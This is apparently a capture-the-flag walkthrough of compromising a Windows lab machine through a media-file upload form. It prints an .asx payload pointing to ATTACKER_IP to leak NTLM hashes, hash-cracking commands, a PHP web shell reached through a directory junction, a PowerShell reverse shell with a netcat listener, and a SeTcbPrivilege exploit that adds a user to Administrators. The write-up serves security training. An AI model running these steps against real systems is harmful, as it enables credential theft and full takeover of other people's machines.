Initial Access
#

Port 80 Enumeration
#

While reviewing the web application on port 80, we observed that this web page only has one functionality which allows users to upload Windows Media Player-compatible video files.

Since the application was running PHP as confirmed by the Nmap scan, I attempted to upload a simple PHP web shell. I tried injecting the usual one liner web shell in place of the media file and it successfully uploaded. However, the upload location of the web shell was still unknown. After checking the front-end source code, we found that the images are being loaded from an assets directory at http://<TARGET_IP>/assets

After visiting it, we found that it has directory listing enabled but there are no useful files. Only image files that are already shown on the website page.

NTLM Hash Capture
#

The website expects us to upload media files so I searched for vulnerabilities regarding uploading of Windows Media Player files. Searching for Windows Media Player upload abuse led to an article on NTLM Privilege Escalation which in one section involved the use of Windows Media Player files. The article described how Windows Media Player playlist formats such as .asx, .wax, .wvx, and .wmx could reference remote resources and trigger NTLM authentication. All we need to do is to make a user open these files. As from the upload message we saw that

So there is a good chance someone may click and open our files and we will capture the NTLMv2 challenge-response hash. The article also provided the contents of an .asx file. We only needed to replace the attacker IP address.

<asx version="3.0">
  <title>Leak</title>
  <entry>
    <title></title>
    <ref href="file://ATTACKER_IP\\share\\track.mp3" />
  </entry>
</asx>

Run the responder tool to capture the hashes:

└─$ sudo responder -I tun0

Upload the file through the upload form and wait for a few moment. After a while we received the NTLMv2 challenge-response hash of the enox user

We can crack the hash by saving it in a file and running Hashcat on it with mode 5600:

└─$ hashcat -m 5600 enox-NTLMv2.txt /usr/share/wordlists/rockyou.txt

SSH Access
#

The password was successfully cracked and we can verify whether the credentials are valid for SSH or WinRM with netexec:

└─$ sudo nxc ssh <TARGET_IP> -u 'enox' -p '<Enox-Password>'
└─$ sudo nxc rdp <TARGET_IP> -u 'enox' -p '<Enox-Password>'

The credentials were valid for both services, but when we tried to login via RDP, it didn’t allow us to log in as along with having valid credentials, our controlled user should also be in the “Remote Desktop Users” group of the target system. But we can use SSH to login as it works:

└─$ ssh enox@<TARGET_IP>

We can find the user.txt in the Desktop of enox user

Escalating Privileges
#

In the Documents folder, a PowerShell script review.ps1 is present which is handling the execution of uploaded files by using Windows Media Player. Looking at the website’s index.php code in “C:\xampp\htdocs”, we can see how the uploaded files are being handled by the web application. The PHP code is present at the top of the index.php file.

The PHP script handles file uploads for a job application form. It sanitizes the user-provided details, generates an MD5 hash of the applicant’s first name, last name, and email, and uses the hash as a unique upload directory under “C:\Windows\Tasks\Uploads".

The uploaded filename is sanitized to allow only alphanumeric characters, periods, and underscores before being saved. Upon a successful upload, the script logs the original filename and the corresponding MD5 directory name to “todo.txt”, which can be used to associate uploaded files with applicants.

Abusing Junctions for Code Execution
#

To get access to the shell.php we uploaded to the web, we need to link it to the root of the htdocs where other files we accessed before are present. Similar to symbolic links (symlinks) on Linux, we can create Junctions in Windows which creates a link between folders. Then we can access the linked folder from the linking folder. To make it work, we need to first get the name of directory that will be created when we upload a file. As the folder name is dependent on the MD5 hash generated by the combination of first name, last name and email we provide in the web upload form, we can simply upload a new file and check which directory is created.

After uploading a file with the above mentioned user details, a folder named “d5cfa30195eeb4b848b7a5d63d09d336” is created and the shell.php file we provided in the upload form is present in the folder. Now we can delete the folder and create a junction from this folder to C:\xampp\htdocs. To delete the folder, we need to make it empty first as:

enox@MEDIA C:\Windows\Tasks\Uploads> del d5cfa30195eeb4b848b7a5d63d09d336\shell.php
enox@MEDIA C:\Windows\Tasks\Uploads> rmdir d5cfa30195eeb4b848b7a5d63d09d336

Then create the Junction with:

enox@MEDIA C:\Windows\Tasks\Uploads> mklink /J "C:\Windows\Tasks\Uploads\d5cfa30195eeb4b848b7a5d63d09d336" "C:\xampp\htdocs"

Now if we list the content of d5cfa30195eeb4b848b7a5d63d09d336 folder, we will see the files present in htdocs so this means we have successfully linked the two folders.

To verify code execution, use curl:

└─$ curl 'http://<TARGET_IP>/shell.php?cmd=whoami'

nt authority\local service

To get a reverse shell as the “local service”, we can generate a PowerShell reverse shell from Revshells. Pass the PowerShell #3 (Base64) payload in the curl command:

└─$ curl 'http://<TARGET_IP>/shell.php?cmd=<PowerShell-Payload>'

Before sending the request, open a netcat listener on the port specified in the payload:

└─$ rlwrap nc -lvnp <PORT>

After gaining the shell, we can check the privileges of the local service:

Exploiting SeTcbPrivilege
#

Looking for exploitation techniques we found a method at ADMinions. The C++ code for the executable is given at GitHub. We can compile the binary ourselves using mingw:

└─$ x86_64-w64-mingw32-g++ TcbElevation.cpp -o TcbElevation.exe -lsecur32 -municode

Transfer the binary using curl and we can execute it with the command of adding our user “enox” to the Administrators group:

PS C:\temp> .\customTCB.exe helo 'net localgroup Administrators enox /add'

Verify that the privilege escalation succeeded by checking the local Administrators group.

PS C:\temp> net localgroup Administrators
Alias name     Administrators
Comment        Administrators have complete and unrestricted access to the computer/domain

Members

-------------------------------------------------------------------------------
Administrator
enox
The command completed successfully.

So now we can SSH again into the system from a new terminal and get the root.txt in the Administrator’s Desktop.
